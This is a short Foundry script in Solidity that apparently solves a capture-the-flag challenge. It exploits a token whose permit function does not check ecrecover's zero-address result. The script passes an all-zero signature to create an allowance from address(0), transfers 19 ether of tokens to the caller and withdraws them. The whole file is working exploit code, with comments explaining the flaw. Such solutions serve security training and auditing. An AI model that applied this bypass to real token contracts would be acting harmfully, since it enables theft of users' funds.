pragma solidity ^0.8.20;

import "forge-std/Script.sol";

interface ISetup {
    function coin() external view returns (address);
    function register() external;
    function isSolved() external view returns (bool);
}

interface ICoin {
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    function transferFrom(address src, address dst, uint wad) external returns (bool);
    function balanceOf(address guy) external view returns (uint);
    function withdraw(uint wad) external;
}

contract Solve is Script {
    function run() public {
        ISetup setup = ISetup(vm.envAddress("SETUP"));
        ICoin coin = ICoin(setup.coin());
        vm.startBroadcast(vm.envUint("PRIV"));
        address user = vm.addr(vm.envUint("PRIV"));
        setup.register();
        // ecrecover() returns zero on error
        // no zero-address check on results of ecrecover()
        // so we can use any invalid signature
        coin.permit(
            address(0),
            user,
            19 ether,
            block.timestamp + 1 days,
            0,
            bytes32(0),
            bytes32(0)
        );
        coin.transferFrom(address(0), user, 19 ether);
        coin.withdraw(coin.balanceOf(user));
        require(setup.isSolved());
        vm.stopBroadcast();
    }
}